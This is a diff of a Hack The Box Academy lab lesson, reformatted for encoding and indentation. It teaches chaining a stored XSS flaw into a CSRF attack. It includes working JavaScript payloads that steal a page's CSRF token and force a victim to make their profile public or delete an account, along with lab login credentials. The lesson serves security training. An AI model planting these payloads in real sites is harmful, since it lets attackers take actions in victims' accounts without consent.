@@ -2,9 +2,9 @@
 
 Let us provide you with a practical example.
 
-Proceed to the end of this section and click onÂ `Click here to spawn the target system!`Â or theÂ `Reset Target`Â icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (`minilab.htb.net`) to access the application.
+Proceed to the end of this section and click on`Click here to spawn the target system!` or the`Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (`minilab.htb.net`) to access the application.
 
-Navigate toÂ `http://minilab.htb.net`Â and log in to the application using the credentials below:
+Navigate to`http://minilab.htb.net` and log in to the application using the credentials below:
 
 - Email: crazygorilla983
 - Password: pisces
@@ -14,13 +14,13 @@ This is an account that we created to look at the application's functionality.
 Some facts about the application:
 
 - The application features same origin/same site protections as anti-CSRF measures (through a server configuration - you won't be able to actually spot it)
-- The application'sÂ _Country_Â field is vulnerable to stored XSS attacks (like we saw in theÂ _Cross-Site Scripting (XSS)_Â section)
+- The application's _Country_ field is vulnerable to stored XSS attacks (like we saw in the _Cross-Site Scripting (XSS)_ section)
 
 Malicious cross-site requests are out of the equation due to the same origin/same site protections. We can still perform a CSRF attack through the stored XSS vulnerability that exists. Specifically, we will leverage the stored XSS vulnerability to issue a state-changing request against the web application. A request through XSS will bypass any same origin/same site protection since it will derive from the same domain!
 
-Now it is time to develop the appropriate JavaScript payload to place within theÂ _Country_Â field of Ela Stienen's profile.
+Now it is time to develop the appropriate JavaScript payload to place within the _Country_ field of Ela Stienen's profile.
 
-Let us target theÂ _Change Visibility_Â request because a successful CSRF attack targetingÂ _Change Visibility_Â can cause the disclosure of a private profile.
+Let us target the _Change Visibility_ request because a successful CSRF attack targeting _Change Visibility_ can cause the disclosure of a private profile.
 
 First, we need to intercept the related request.
 
@@ -31,9 +31,9 @@ Run Burp Suite as follows.
 smoothment@htb[/htb]$ burpsuite
 ```
 
-By browsing the application, we notice that Ela Stienen can't share her profile. This is because her profile isÂ _private_. Let us change that by clicking "Change Visibility."
+By browsing the application, we notice that Ela Stienen can't share her profile. This is because her profile is _private_. Let us change that by clicking "Change Visibility."
 
-Then, activate Burp Suite's proxy (_Intercept On_) and configure your browser to go through it. Now clickÂ _Make Public!_.
+Then, activate Burp Suite's proxy (_Intercept On_) and configure your browser to go through it. Now click _Make Public!_.
 
 ![image](https://academy.hackthebox.com/storage/modules/153/45.png)
 
@@ -43,7 +43,7 @@ You should see the below inside Burp Suite's proxy.
 
 Forward all requests so that Ela Stienen's profile becomes public.
 
-Let us focus on the payload we should specify in theÂ _Country_Â field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings (From private to public and vice versa).
+Let us focus on the payload we should specify in the _Country_ field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings (From private to public and vice versa).
 
 The payload we should specify can be seen below.
 
@@ -54,18 +54,18 @@ req.onload = handleResponse;
 req.open('get','/app/change-visibility',true);
 req.send();
 function handleResponse(d) {
-    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/app/change-visibility', true);
-    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    changeReq.send('csrf='+token+'&action=change');
+ var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+ var changeReq = new XMLHttpRequest();
+ changeReq.open('post', '/app/change-visibility', true);
+ changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+ changeReq.send('csrf='+token+'&action=change');
 };
 </script>
 ```
 
 Let us break things down for you.
 
-Firstly we put the entire script inÂ `<script>`Â tags, so it gets executed as valid JavaScript; otherwise, it will be rendered as text.
+Firstly we put the entire script in`<script>` tags, so it gets executed as valid JavaScript; otherwise, it will be rendered as text.
 
 
 ```javascript
@@ -75,21 +75,21 @@ req.open('get','/app/change-visibility',true);
 req.send();
 ```
 
-The script snippet above creates an ObjectVariable calledÂ _req_, which we will be using to generate a request.Â _var req = new XMLHttpRequest();_Â is allowing us to get ready to send HTTP requests.
+The script snippet above creates an ObjectVariable called _req_, which we will be using to generate a request. _var req = new XMLHttpRequest();_ is allowing us to get ready to send HTTP requests.
 
 
 ```javascript
 req.onload = handleResponse;
 ```
 
-In the script snippet above, we see theÂ _onload_Â event handler, which will perform an action once the page has been loaded. This action will be related to theÂ _handleResponse_Â function that we will define later.
+In the script snippet above, we see the _onload_ event handler, which will perform an action once the page has been loaded. This action will be related to the _handleResponse_ function that we will define later.
 
 
 ```javascript
 req.open('get','/app/change-visibility',true);
 ```
 
-In the script snippet above, we pass three arguments.Â _get_Â which is the request method, the targeted pathÂ _/app/change-visibility_Â and thenÂ _true_Â which will continue the execution.
+In the script snippet above, we pass three arguments. _get_ which is the request method, the targeted path _/app/change-visibility_ and then _true_ which will continue the execution.
 
 
 ```javascript
@@ -101,24 +101,24 @@ The script snippet above will send everything we constructed in the HTTP request
 
 ```javascript
 function handleResponse(d) {
-    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/app/change-visibility', true);
-    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    changeReq.send('csrf='+token+'&action=change');
+ var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+ var changeReq = new XMLHttpRequest();
+ changeReq.open('post', '/app/change-visibility', true);
+ changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+ changeReq.send('csrf='+token+'&action=change');
 };
 ```
 
-The script snippet above defines a function calledÂ _handleResponse_.
+The script snippet above defines a function called _handleResponse_.
 
 
 ```javascript
 var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
 ```
 
-The script snippet above defines a variable calledÂ _token_, which gets the value ofÂ _responseText_Â from the page we specified earlier in our request.Â `/name="csrf" type="hidden" value="(\w+)"/)[1];`Â looks for a hidden input field calledÂ _csrf_Â and \w+ matches one or more alphanumeric characters. In some cases, this may be different, so let us look at how you can identify the name of a hidden value or check if it is actually "CSRF".
+The script snippet above defines a variable called _token_, which gets the value of _responseText_ from the page we specified earlier in our request.`/name="csrf" type="hidden" value="(\w+)"/)[1];` looks for a hidden input field called _csrf_ and \w+ matches one or more alphanumeric characters. In some cases, this may be different, so let us look at how you can identify the name of a hidden value or check if it is actually "CSRF".
 
-Open Web Developer Tools (Shift+Ctrl+I in the case of Firefox) and navigate to theÂ _Inspector_Â tab. We can use theÂ _search_Â functionality to look for a specific string. In our case, we look forÂ _csrf_, and we get a result.
+Open Web Developer Tools (Shift+Ctrl+I in the case of Firefox) and navigate to the _Inspector_ tab. We can use the _search_ functionality to look for a specific string. In our case, we look for _csrf_, and we get a result.
 
 ![image](https://academy.hackthebox.com/storage/modules/153/57.png)
 
@@ -126,12 +126,12 @@ Open Web Developer Tools (Shift+Ctrl+I in the case of Firefox) and navigate to t
 
 ```javascript
 var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/app/change-visibility', true);
-    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    changeReq.send('csrf='+token+'&action=change');
+ changeReq.open('post', '/app/change-visibility', true);
+ changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+ changeReq.send('csrf='+token+'&action=change');
 ```
 
-The script snippet above constructs the HTTP request that we will send through aÂ [XMLHttpRequest](https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest/)Â object.
+The script snippet above constructs the HTTP request that we will send through a [XMLHttpRequest](https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest/) object.
 
 ```javascript
 changeReq.open('post', '/app/change-visibility', true);
@@ -144,23 +144,23 @@ In the script snippet above, we change the method from GET to POST. The first re
 changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 ```
 
-The script snippet above is setting the Content-Type toÂ _application/x-www-form-urlencoded_.
+The script snippet above is setting the Content-Type to _application/x-www-form-urlencoded_.
 
 ```javascript
 changeReq.send('csrf='+token+'&action=change');
 ```
 
-The script snippet above sends the request with one param calledÂ _csrf_Â having the value of theÂ _token_Â variable, which is essentially the victim's CSRF token, and another parameter calledÂ _action_Â with the valueÂ _change_. These are the two parameters that we noticed while inspecting the targeted request through Burp.
+The script snippet above sends the request with one param called _csrf_ having the value of the _token_ variable, which is essentially the victim's CSRF token, and another parameter called _action_ with the value _change_. These are the two parameters that we noticed while inspecting the targeted request through Burp.
 
 ![image](https://academy.hackthebox.com/storage/modules/153/56.png)
 
 Let us try to make a victim's profile public.
 
-First, submit the full payload to theÂ _Country_Â field of Ela Stienen's profile and click "Save".
+First, submit the full payload to the _Country_ field of Ela Stienen's profile and click "Save".
 
 ![image](https://academy.hackthebox.com/storage/modules/153/44.png)
 
-Open aÂ `New Private Window`, navigate toÂ `http://minilab.htb.net`Â again and log in to the application using the credentials below:
+Open a`New Private Window`, navigate to`http://minilab.htb.net` again and log in to the application using the credentials below:
 
 - Email: goldenpeacock467
 - Password: topcat
@@ -192,11 +192,11 @@ req.onload = handleResponse;
 req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
 req.send();
 function handleResponse(d) {
-    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/app/delete', true);
-    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    changeReq.send('csrf='+token);
+ var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+ var changeReq = new XMLHttpRequest();
+ changeReq.open('post', '/app/delete', true);
+ changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+ changeReq.send('csrf='+token);
 };
 </script>
 ```
